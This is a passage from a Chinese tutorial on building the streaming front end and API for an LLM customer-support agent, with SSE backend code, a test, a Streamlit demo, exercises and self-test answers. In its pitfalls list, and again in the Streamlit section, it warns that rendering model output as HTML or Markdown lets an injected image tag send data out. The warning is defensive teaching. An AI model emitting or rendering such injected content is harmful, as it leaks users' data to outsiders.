最后是失败的样子。模型接口超时、数据库断了、工具报错,界面上应该显示什么?演示版里任何异常都会让 SSE 流中断,前端只能看到一个报错。生产环境至少要做到:后端捕获异常后推一个 `error` 事件,前端显示"处理遇到问题,已转人工",同时把工单标为转人工,而不是让客户对着一个卡住的页面。这个留作练习。

## 测试整条链路

```python
# supportpilot/tests/test_api.py
from fakes import FakeLLM, FakeTools, make_deps
from fastapi.testclient import TestClient
from langgraph.checkpoint.memory import InMemorySaver
from test_graph_smoke import ACT, DRAFT, REFUND_TRIAGE, TICKET

import supportpilot.api.app as api
from supportpilot.agent.graph import build_graph


def parse(text: str) -> list[tuple[str, str]]:
    out, event = [], None
    for line in text.splitlines():
        if line.startswith("event:"):
            event = line[6:].strip()
        elif line.startswith("data:"):
            out.append((event, line[5:].strip()))
    return out


def test_sse_run_then_approve(monkeypatch):
    saver = InMemorySaver()
    tools = FakeTools(customer={"id": "C0002"})
    deps = make_deps(FakeLLM(REFUND_TRIAGE, ACT, DRAFT), tools)
    monkeypatch.setattr(api, "_graph", lambda: build_graph(deps, checkpointer=saver))

    events = list(api._events(api._graph(), {"ticket": TICKET}, TICKET["id"]))
    kinds = [e["event"] for e in events]
    assert "tool" in kinds and "token" in kinds and "interrupt" in kinds and kinds[-1] == "done"

    client = TestClient(api.app)  # 不进 with 块,不触发 lifespan(不连数据库)
    r = client.post(f"/approvals/{TICKET['id']}", json={"approved": True, "approver": "amy"})
    got = parse(r.text)
    assert got[-1][0] == "done" and '"outcome": "resolved"' in got[-1][1]
    assert client.post(f"/approvals/{TICKET['id']}", json={"approved": True, "approver": "amy"}).status_code == 409
```

这个测试做了三件事:用假 LLM 跑 `_events`,检查事件流里有工具调用、逐字输出、审批暂停和完成;用 FastAPI 的 `TestClient` 调审批接口,解析返回的 SSE 文本,确认最后的 done 事件里工单已经 resolved;再调一次审批接口,应该返回 409,因为工单已经不在等审批了。

`monkeypatch.setattr(api, "_graph", ...)` 把接口里编译图的函数换成用假依赖编译的版本。`TestClient(api.app)` 不放在 `with` 块里,FastAPI 就不会触发 lifespan,也就不会去连数据库。这两个技巧让接口层的测试也能做到不连库、不花钱。我本机跑过,通过。

## 备选:不会前端就用 Streamlit

如果你没写过 React,不想为了一个界面去学 Next.js,Streamlit 是更快的路:纯 Python,一个文件,一百行。它的模型是"每次交互,整个脚本从头跑一遍",点一下按钮脚本重跑,按钮那一行返回 True。读 SSE 用 httpx 的流式请求自己逐行解析;`st.status` 折叠框里逐行写步骤和工具调用;`st.empty` 占位符收到 token 就重写一遍,就是打字机效果。上面讲的几条原则在这里一样适用:质检退回要清空草稿,停在审批时不能追问,模型输出别当 HTML 渲染(`st.markdown` 默认会渲染图片,Day 53 会让你换掉)。

```bash
uv add streamlit httpx
uv run streamlit run src/supportpilot/ui/streamlit_app.py   # 先起后端
```

```python
# supportpilot/src/supportpilot/ui/streamlit_app.py
"""演示界面。先起后端(uvicorn),再:uv run streamlit run src/supportpilot/ui/streamlit_app.py"""

import json
import os

import httpx
import streamlit as st

API = os.getenv("SUPPORTPILOT_API", "http://localhost:8000")
DEMO_EMAILS = ["lina@example.com", "wangfang@example.com", "liuyang@example.com", "chenjing@example.com",
               "yanglei@example.com", "wugang@example.com", "nobody@example.com"]
STEP_NAMES = {"load_customer": "查客户档案", "prepare_context": "整理上下文", "classify": "分诊",
              "retrieve": "检索帮助中心", "act": "查业务数据", "draft": "起草回复", "check": "质检",
              "approval": "等待审批", "finalize": "定稿", "handoff": "转人工"}


def sse(method: str, path: str, payload: dict | None = None):
    """读 SSE 流,逐个产出 (event, data)。"""
    with httpx.Client(timeout=None) as client, client.stream(method, API + path, json=payload) as r:
        r.raise_for_status()
        event = "message"
        for line in r.iter_lines():
            if line.startswith("event:"):
                event = line[6:].strip()
            elif line.startswith("data:"):
                yield event, json.loads(line[5:].strip())


def render_run(events) -> dict:
    """把一次运行的事件流画出来:步骤进度、工具卡片、打字机效果的回复。"""
    status = st.status("处理中…", expanded=True)
    text_box = st.empty()
    typed = ""
    done: dict = {}
    for event, data in events:
        if event == "node":
            status.write(f"✓ {STEP_NAMES.get(data['node'], data['node'])}")
        elif event == "tool":
            status.code(f"{data['name']}({data['args']})" + ("  ← 出错" if data["error"] else ""), language="text")
        elif event == "step" and data.get("node") == "check" and not data["passed"]:
            status.warning("质检退回:" + ";".join(data["problems"]))
            typed = ""  # 重写草稿,清空打字机
        elif event == "token":
            typed += data["text"]
            text_box.markdown(typed + "▌")
        elif event == "interrupt":
            status.info(f"退款申请 {data['request']['id']}({data['request']['amount_cny']} 元)已提交,等待人工审批")
        elif event == "done":
            done = data
    status.update(label=f"完成 · {done.get('outcome')} · 花费 ¥{done.get('cost_cny')}", state="complete",
                  expanded=False)
    text_box.markdown(done.get("reply") or typed)
    return done


st.set_page_config(page_title="SupportPilot", layout="wide")
st.title("SupportPilot · CloudLedger 智能客服")
customer_tab, desk_tab = st.tabs(["客户视角", "客服工作台"])

with customer_tab:
    with st.form("new_ticket"):
        email = st.selectbox("发件邮箱(演示数据)", DEMO_EMAILS)
        subject = st.text_input("主题", "想退款")
        body = st.text_area("问题描述", "上周买的专业版年付,发现用不上,能退吗?请帮我退款。")
        submitted = st.form_submit_button("提交工单")
    if submitted:
        tid = httpx.post(f"{API}/tickets", json={"customer_email": email, "subject": subject, "body": body}).json()[
            "ticket_id"]
        st.session_state["ticket_id"] = tid
        st.caption(f"工单号 {tid}")
        render_run(sse("POST", f"/tickets/{tid}/run"))
    if tid := st.session_state.get("ticket_id"):
        if msg := st.chat_input(f"在工单 {tid} 里继续追问"):
            st.chat_message("user").write(msg)
            with st.chat_message("assistant"):
                render_run(sse("POST", f"/tickets/{tid}/messages", {"content": msg}))

with desk_tab:
    st.subheader("待审批退款")
    pending = httpx.get(f"{API}/approvals").json()
    if not pending:
        st.write("没有待审批的退款。")
    for r in pending:
        with st.container(border=True):
            st.markdown(f"**{r['id']}** · {r['customer_name']} · ¥{r['amount_cny']} · 规则 `{r['rule']}`")
            st.caption(f"工单 {r['ticket_id']}:{r.get('subject') or ''} · 原因:{r['reason']}")
            if r["amount_cny"] > 1000:
                st.error("金额超过 1,000 元,按政策需要财务复核")
            note = st.text_input("审批备注", key=f"note-{r['id']}")
            c1, c2 = st.columns(2)
            for col, ok, label in ((c1, True, "通过"), (c2, False, "驳回")):
                if col.button(label, key=f"{label}-{r['id']}"):
                    render_run(sse("POST", f"/approvals/{r['ticket_id']}",
                                   {"approved": ok, "approver": "demo-finance", "note": note}))
```

Streamlit 版的局限要在 README 里写清楚:每次只显示最近一轮,不保留对话历史(要保留得存进 `st.session_state`);没有登录,任何人都能审批;流式过程中不能停止。面试官看到"任何人都能审批"会问的,你提前写了就是"知道并且有计划",没写就是"没想到"。

## 动手练习

**步骤 1:后端。** `agent/deps.py` 加上 `fresh()` 方法(顶部 import 改成 `from dataclasses import dataclass, replace`),新增 `api/app.py`(含 CORS 中间件)和 `tests/test_api.py`,跑 `make test`。

**步骤 2:先用 curl 看原始事件。** 在看界面之前,先确认后端的流是对的,出问题时能分清是后端还是前端:

```bash
make api      # uvicorn,http://localhost:8000/docs 能看到自动生成的接口文档
curl -s -X POST localhost:8000/tickets -H 'content-type: application/json' \
  -d '{"customer_email":"liuyang@example.com","subject":"扣了两次","body":"9月12号被扣了两次39元,请退一笔"}'
# 返回 {"ticket_id":"T000xxx"}
curl -N -X POST localhost:8000/tickets/T000xxx/run
```

`-N` 关掉 curl 的缓冲,你会看到 `event: node`、`event: tool`、一串 `event: token` 一条条冒出来。顺手按一次 Ctrl-C,再 GET 这张工单,看看停在哪个节点。

**步骤 3:前端先接假后端。** 按"项目结构"一节生成 `web/`,放入全部文件,`npm run build` 必须通过(类型检查也在里面)。起假后端和 `npm run dev`,把"不花钱调界面"那张表里的六项逐一在浏览器里点一遍。

**步骤 4:接真后端。** `web/.env.local` 写 `NEXT_PUBLIC_SUPPORTPILOT_API=http://localhost:8000`,重启 dev server。客户视角选 `lina@example.com` 提交退款工单,看着它停在审批;打开 `/desk`,点通过;回到客户视角点"刷新进展",再追问"大概几天到账?"。再用 `chenjing@example.com` 提交"这个月的钱退给我",确认不会出现在待审批里。Makefile 里加一个 `web` 目标(`cd web && npm run dev`),和 `api` 并排。

**步骤 5:录一段 2 分钟的屏。** 录下步骤 4,存起来。Day 54 做演示视频时这是素材。

**步骤 6:并发检查成本。** 开两个浏览器窗口同时提交两张工单,两张的花费都应该在合理范围(各几分钱以内),不会一张特别高一张特别低。这是在验证今天修的那个 bug。

**步骤 7:失败也要好看。** 在 `_events` 外面包一层 try/except:出异常时推一个 `event: error`(data 是 `{"message": "处理遇到问题,已转给人工客服"}`),并调用 `escalate_to_human` 把工单转人工。前端已经认识 error 事件了。验证方法:把 `.env` 里的 `LLM_API_KEY` 故意改错,提交一张工单,页面上应该看到红色提示,数据库里这张工单是 escalated。

**步骤 8(选做):让列表接口返回 `needs_finance_review`。** 去掉前端写死的 1,000 元阈值。

**步骤 9(选做):说一次 AI SDK 的协议。** 给后端加一个 `POST /chat` 接口,把 LangGraph 的流翻译成 AI SDK 的 UI Message Stream(响应头 `x-vercel-ai-ui-message-stream: v1`,token 映射成 `text-delta`,工具调用映射成 `tool-input-available`,步骤映射成自定义的 `data-step`),前端新开一个页面用 `useChat` 接。做完你会对"前端方便"和"后端迁就"之间的取舍有自己的判断。

**验收标准:** 后端测试全绿;`next build` 通过;假后端下六项交互全部符合预期;真后端下能完成"提交 → 看过程 → 审批 → 刷新看到定稿 → 追问"全流程;停止、错误、空状态都有提示;读屏软件(macOS 用 VoiceOver,Cmd+F5)不会逐字播报回复。

## 名词解释

| 名词 | 意思 |
| --- | --- |
| SSE | Server-Sent Events,服务器单向推送事件的 HTTP 协议,浏览器原生支持 |
| EventSource | 浏览器自带的 SSE 客户端,只能发 GET 请求,会自动重连 |
| ReadableStream | 浏览器里表示"一点点到达的数据"的对象,`fetch` 的响应体就是一个 |
| TextDecoderStream | 把字节流解码成文本流,能正确处理被切断的多字节字符 |
| eventsource-parser | 把 SSE 文本切成一条条事件的小库 |
| 判别联合类型 | TypeScript 里用一个公共字段(这里是 `event`)区分不同形状的联合类型 |
| useReducer | React 的状态管理 hook,用一个纯函数根据动作算出新状态 |
| AbortController | 用来取消 fetch 等异步操作的浏览器 API |
| CORS | 跨域资源共享,浏览器限制网页向不同源的服务器发请求,服务端用响应头放行 |
| aria-live | 告诉读屏软件"这块内容变了要播报"的属性 |
| UI Message Stream | Vercel AI SDK 定义的流式协议,`useChat` 消费的就是它 |
| 409 Conflict | HTTP 状态码,表示请求和资源当前状态冲突 |
| iterate_in_threadpool | 把同步生成器放进线程池迭代,避免阻塞事件循环 |

## 常见误区

**只显示一个转圈。** Agent 处理一张工单要十几秒,看不到过程的用户会焦虑、会重复提交。把过程推出来,既是体验也是可信度。

**为了用 EventSource 把接口改成 GET。** 有副作用的操作走 GET,会被预取、缓存、记进访问日志。保持 POST,用 fetch 读流。

**把模型输出当 HTML 或 Markdown 直接渲染。** 一个被注入的 `<img>` 就能把数据发到外面。模型输出当纯文本,链接只渲染自己解析出来、格式可控的那部分。

**逐字输出的区域设成 aria-live。** 读屏软件会把一句话拆成几十次播报。只播报状态变化,回复跑完再读。

**以为"停止"就是撤销。** 断开连接只是不再往下跑,已经执行的工具调用不会回滚。撤销要在后端设计。

**在 async 接口里直接跑同步阻塞代码。** 一个请求卡住整个服务。要么放线程池,要么整条链路异步。

**共享对象不考虑并发。** 成本账本只是一个例子。缓存、计数器、连接,所有跨请求共享的可变状态都要过一遍"两个请求同时用会怎样"。

**以为 NEXT_PUBLIC_ 变量是运行时读的。** 它在构建时被替换成字面量,换地址要重新 build。

## 学习资料

### 文档与文章

- [MDN · 使用可读流](https://developer.mozilla.org/zh-CN/docs/Web/API/Streams_API/Using_readable_streams):`getReader()`、`pipeThrough()` 这些今天用到的 API,中文版,30 分钟。
- [MDN · Server-sent events](https://developer.mozilla.org/zh-CN/docs/Web/API/Server-sent_events):SSE 协议本身和 EventSource 的限制,20 分钟。
- [MDN · AbortController](https://developer.mozilla.org/zh-CN/docs/Web/API/AbortController):取消请求,10 分钟。
- [MDN · aria-live](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Attributes/aria-live):live region 的几个取值和播报时机,英文,15 分钟。
- [React · useReducer](https://react.dev/reference/react/useReducer):什么时候用 reducer 而不是一堆 useState,20 分钟。
- [Next.js · Environment Variables](https://nextjs.org/docs/app/guides/environment-variables):`NEXT_PUBLIC_` 的构建期替换,10 分钟。
- [AI SDK · Stream Protocols](https://ai-sdk.dev/docs/ai-sdk-ui/stream-protocol):UI Message Stream 的全部事件类型,做练习 9 时对着看,30 分钟。
- [FastAPI · CORS](https://fastapi.tiangolo.com/tutorial/cors/):CORSMiddleware 的参数,10 分钟。
- [LangGraph Streaming](https://docs.langchain.com/oss/python/langgraph/streaming):`updates` 和 `custom` 两种模式的输出格式,复习 15 分钟。

### B 站视频

- 上面嵌的今晚吃泡面a《chatgpt stream 实时输出功能实现原理 SSE》和码里奥Ziho《Vercel AI SDK 零基础教程》。
- 黑马程序员《FastAPI 从入门到实战》(BV1zV2QBtE39,合集):如果 Day 36 的 FastAPI 还不熟,挑路由、依赖注入、异步编程那几集补。
- 技术蛋老师《入门即可搭建 AI 应用的框架 Streamlit》(BV1T5CJY7ECQ,9 分钟):走 Streamlit 备选路线的看这个。

### 其他经典视频

<figure class="video">
<div class="video-frame"><iframe src="https://www.youtube-nocookie.com/embed/WKIjkxxNH0c" title="Build a Support Agent with Vercel AI SDK – Full Tutorial" loading="lazy" allow="accelerometer; encrypted-media; picture-in-picture" allowfullscreen></iframe></div>
<figcaption>freeCodeCamp.org · Build a Support Agent with Vercel AI SDK · 也是做一个客服 Agent,全 TypeScript 栈。挑前端和工具调用渲染的部分看,对比它用 useChat 和我们手写 reducer 的差别。</figcaption>
</figure>

- Alejandro AO《Stream LLMs with LangChain + Streamlit》(YouTube,zKGeRWjJlTU):Streamlit 路线里做流式输出和会话历史的另一种写法。

### 书籍

- Chip Huyen《AI Engineering》第 10 章 AI Engineering Architecture and User Feedback:后半部分讲怎么在界面上收集用户反馈(显式的点赞点踩、隐式的重新生成和修改),这是我们界面下一步该加的东西,约 1 小时。

### 开源项目与代码

- [rexxars/eventsource-parser](https://github.com/rexxars/eventsource-parser):今天用的解析器,源码很短,值得读一遍 parse.ts,看它怎么处理被切断的事件。
- [vercel/ai 的 next-fastapi 示例](https://github.com/vercel/ai/tree/main/examples/next-fastapi):Python 后端说 AI SDK 协议的官方示例,练习 9 的参考。
- [sysid/sse-starlette](https://github.com/sysid/sse-starlette):README 里的心跳(ping)和断开检测配置。

## 自测

**1. 所有请求共用一个 LLMClient 时,节点的成本为什么会算错?`fresh()` 怎么解决?**

<details><summary>答案</summary>

节点用"结束时账本读数减开始时读数"算成本。共享客户端时,两个请求的调用都记在同一个账本上,A 节点执行期间 B 的花费也会被算进 A。`fresh()` 给每个请求新建 LLMClient(各自独立的账本),检索器、数据库连接等重对象仍然共享。

</details>

**2. 为什么前端不用浏览器自带的 EventSource?**

<details><summary>答案</summary>

EventSource 只能发 GET,不能带请求体和自定义请求头。我们的流式接口(跑工单、追问、审批)都是 POST,追问和审批要带内容;把有副作用的操作改成 GET 会被预取、缓存和记录。所以用 fetch 读响应体,自己(借助 eventsource-parser)解析 SSE,代价是自动重连要自己处理。

</details>

**3. 页面上出现了"✓ 分诊 · 分类:refund"紧跟着又一个"✓ 分诊",原因是什么,怎么改?**

<details><summary>答案</summary>

同一个节点通过两个事件到达:`step` 在节点执行中推送细节,`node` 在节点跑完后推送完成。两个事件各往步骤列表插了一行。改法是确定 `node` 是"步骤完成"的唯一来源,只由它追加步骤;`step` 带来的细节按节点名存到另一个字典里,渲染时挂到对应步骤上。

</details>

**4. 用户点了"停止",后端的工作流会怎样?退款申请会被撤销吗?**

<details><summary>答案</summary>

前端 abort 后连接断开,sse-starlette 检测到断开就不再从生成器取下一个事件;线程池里正在执行的那一步会跑完,之后的节点不再执行,状态停在最后完成的节点。已经执行的工具调用不会回滚,如果 act 节点已经建了退款申请,它还在。所以"停止"只表示不再往下跑,撤销要在后端单独设计。

</details>

**5. 「面试题」你的 Agent 服务怎么做流式输出?前端怎么接?为什么用 SSE 不用 WebSocket?**

<details><summary>答案</summary>

后端:LangGraph 用 `stream_mode=["updates","custom"]` 同时拿到节点完成事件和节点内部主动推送的事件(工具调用、逐字 token、质检结果),FastAPI 里翻译成约定好的 SSE 事件(node/step/tool/token/interrupt/done),同步的图通过线程池迭代避免阻塞。前端:fetch 读响应体,TextDecoderStream 解码,eventsource-parser 切事件,事件进 reducer,组件只渲染状态;质检退回清空草稿,停在审批时禁用追问,AbortController 支持停止。用 SSE 是因为通信本质是单向的:服务器推过程,客户端的追问和审批是独立的普通 HTTP 请求;SSE 基于普通 HTTP,穿透代理和负载均衡更容易。需要双向实时通信(比如语音)时才考虑 WebSocket。

</details>

**6. 「面试题」做 AI 聊天界面,你会用 Vercel AI SDK 的 useChat 还是自己写?怎么判断?**

<details><summary>答案</summary>

看后端和交互模型。后端是 Node 或者愿意按 AI SDK 的 UI Message Stream 协议输出(响应头 `x-vercel-ai-ui-message-stream: v1`、text-delta/tool-input-available/data-* 等事件),交互又是标准的一问一答聊天,用 useChat 能省掉流解析、消息状态、工具调用渲染这一大块代码。如果后端已经有自己的事件协议(比如 LangGraph 的节点、步骤、审批暂停),或者交互不是单人聊天(审批在另一个角色的页面上完成),硬套 useChat 要么后端写一层翻译迁就前端,要么前端绕弯,这时自己用 fetch + 解析器 + reducer 更直接。两种都能说清楚取舍,比只会其中一种更有说服力。

</details>

## 明天预告

Day 50 · 评测体系:100 条测试集、LLM-judge、轨迹评测,跑出第一份分数。按 Day 43 的验收指标设计评测集:36 个场景、100 种客户说法,按场景拆 dev/test;三层评测:规则检查(分类、工具、退款闸门、引用、事实、禁语)、LLM 评审(有没有依据、有没有解决问题)、轨迹和成本;跑出第一份基线报告。
